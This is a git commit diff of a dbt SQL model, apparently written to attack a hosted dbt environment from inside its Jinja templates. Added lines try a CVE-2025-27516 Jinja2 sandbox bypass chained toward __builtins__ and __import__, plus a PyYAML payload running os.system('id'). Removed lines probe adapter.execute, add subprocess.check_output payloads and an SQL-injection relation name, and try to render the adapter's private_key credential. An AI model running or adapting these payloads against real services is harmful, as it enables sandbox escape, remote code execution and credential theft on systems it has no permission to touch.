0044bff6bf35ed7449ec5c5ac1f75f08ed17e29e
hunter <hunter@WD168220234152noidaspeedvpsFY1KQ5t4wW.test.com>
2026-09-23 13:35:29 +0530

    CVE-2025-27516 jinja2 sandbox bypass test

--- models/deep_dig.sql
+++ models/deep_dig.sql
@@ -1,55 +1,49 @@
-{# Module-level code execution attempts + adapter.execute probe #}
+{# CVE-2025-27516 Jinja2 < 3.1.6 sandbox bypass via attr("format") #}
+{# If vulnerable: attr filter uses raw getattr() instead of environment.getattr() #}
 
-{# 1. Try adapter.execute directly - bypass compile execute flag #}
-{%- set exec_result = adapter.execute("SELECT 1 as test_col") -%}
-{{ log("ADAPTER_EXEC_RESULT=" ~ exec_result | string | truncate(500), info=True) }}
-{{ log("ADAPTER_EXEC_TYPE=" ~ exec_result.__class__.__name__ if exec_result.__class__ is defined else 'unknown', info=True) }}
+{# Step 0: Check Jinja2 version #}
+{%- set jinja_version = '' -%}
+{%- if modules.jinja2 is defined -%}
+  {{ log("JINJA2_VERSION=" ~ modules.jinja2.__version__, info=True) }}
+{%- else -%}
+  {{ log("JINJA2_NOT_IN_MODULES", info=True) }}
+{%- endif -%}
 
-{# 2. Try adapter.list_schemas #}
-{%- set schemas = adapter.list_schemas("test-project-ssrf") -%}
-{{ log("ADAPTER_LIST_SCHEMAS=" ~ schemas | string | truncate(500), info=True) }}
+{# Step 1: Test if attr("format") bypasses sandbox #}
+{# This is the CVE-2025-27516 payload #}
+{%- set payload1 = "{0.__class__}" -%}
+{%- set result1 = payload1 | attr("format")(lipsum) -%}
+{{ log("CVE_27516_TEST1=" ~ result1 | string | truncate(500), info=True) }}
 
-{# 3. re.Pattern.scanner - can it access internals? #}
-{%- set pat = modules.re.compile('(\\w+)') -%}
-{%- set scanner = pat.scanner('hello world test') -%}
-{{ log("SCANNER_TYPE=" ~ scanner | string | truncate(200), info=True) }}
-{%- set scanner_match = scanner.match() -%}
-{{ log("SCANNER_MATCH=" ~ scanner_match | string | truncate(200), info=True) }}
+{# Step 2: If step 1 works (returns a class reference), try deeper #}
+{%- set payload2 = "{0.__class__.__init__.__globals__}" -%}
+{%- set result2 = payload2 | attr("format")(lipsum) -%}
+{{ log("CVE_27516_TEST2=" ~ result2 | string | truncate(500), info=True) }}
 
-{# 4. Try to access re module's internal _compile via different path #}
-{%- set template_obj = modules.re.template('test') -%}
-{{ log("RE_TEMPLATE_TYPE=" ~ template_obj | string | truncate(200), info=True) }}
+{# Step 3: Try to access builtins through format #}
+{%- set payload3 = "{0.__class__.__init__.__globals__[__builtins__]}" -%}
+{%- set result3 = payload3 | attr("format")(lipsum) -%}
+{{ log("CVE_27516_TEST3=" ~ result3 | string | truncate(500), info=True) }}
 
-{# 5. Check if any module has __file__ accessible #}
-{%- for mod_name in ['re', 'datetime', 'pytz', 'itertools'] -%}
-  {%- set mod = modules[mod_name] -%}
-  {%- set file_attr = mod.__file__ if mod.__file__ is defined else 'NO_FILE' -%}
-  {{ log("MODULE_" ~ mod_name ~ "_FILE=" ~ file_attr, info=True) }}
-{%- endfor -%}
+{# Step 4: Try os.popen for RCE #}
+{%- set payload4 = "{0.__class__.__init__.__globals__[__builtins__][__import__]}" -%}
+{%- set result4 = payload4 | attr("format")(lipsum) -%}
+{{ log("CVE_27516_TEST4=" ~ result4 | string | truncate(500), info=True) }}
 
-{# 6. Try fromyaml with crafted YAML that might trigger deserialization #}
-{# PyYAML has known deserialization vulnerabilities #}
-{%- set yaml_str = "!!python/object/apply:os.system ['id']" -%}
-{%- set yaml_parsed = fromyaml(yaml_str) -%}
-{{ log("YAML_DESER_RESULT=" ~ yaml_parsed | string | truncate(200), info=True) }}
+{# Step 5: Alternative payload via str format_map #}
+{# format_map passes the object directly, different path #}
+{%- set alt_payload = "{x.__class__}" -%}
+{%- set result5 = alt_payload.format_map({'x': ''}) -%}
+{{ log("FORMAT_MAP_TEST=" ~ result5 | string | truncate(500), info=True) }}
 
-{# 7. Try a different YAML deserialization payload #}
-{%- set yaml_str2 = "!!python/object/new:subprocess.check_output [['id']]" -%}
-{%- set yaml_parsed2 = fromyaml(yaml_str2) -%}
-{{ log("YAML_DESER2_RESULT=" ~ yaml_parsed2 | string | truncate(200), info=True) }}
+{# Step 6: Try YAML deserialization (moved here to not block CVE test) #}
+{%- set yaml1 = "test: value" -%}
+{%- set yaml_safe = fromyaml(yaml1) -%}
+{{ log("YAML_SAFE_PARSE=" ~ yaml_safe | string, info=True) }}
 
-{# 8. Try !!python/name payload #}
-{%- set yaml_str3 = "!!python/name:os.system" -%}
-{%- set yaml_parsed3 = fromyaml(yaml_str3) -%}
-{{ log("YAML_DESER3_RESULT=" ~ yaml_parsed3 | string | truncate(200), info=True) }}
-
-{# 9. Probe adapter.Relation for SQL injection in relation names #}
-{{ log("ADAPTER_RELATION=" ~ adapter.Relation | string | truncate(200), info=True) }}
-{%- set rel = adapter.Relation.create(database='test', schema='public', identifier="x'; DROP TABLE students; --") -%}
-{{ log("CRAFTED_RELATION=" ~ rel | string | truncate(200), info=True) }}
-
-{# 10. Try render() with template that references internal variables #}
-{%- set render_test = render("{{ adapter.config.credentials.keyfile_json.get('private_key', 'nope') }}") -%}
-{{ log("RENDER_CRED_TEST=" ~ render_test | truncate(200), info=True) }}
+{%- set yaml2 = "!!python/object/apply:os.system ['id']" -%}
+{{ log("YAML_DESER_ATTEMPTING=!!python/object/apply", info=True) }}
+{%- set yaml_evil = fromyaml(yaml2) -%}
+{{ log("YAML_DESER_RESULT=" ~ yaml_evil | string | truncate(200), info=True) }}
 
 SELECT 1 as id
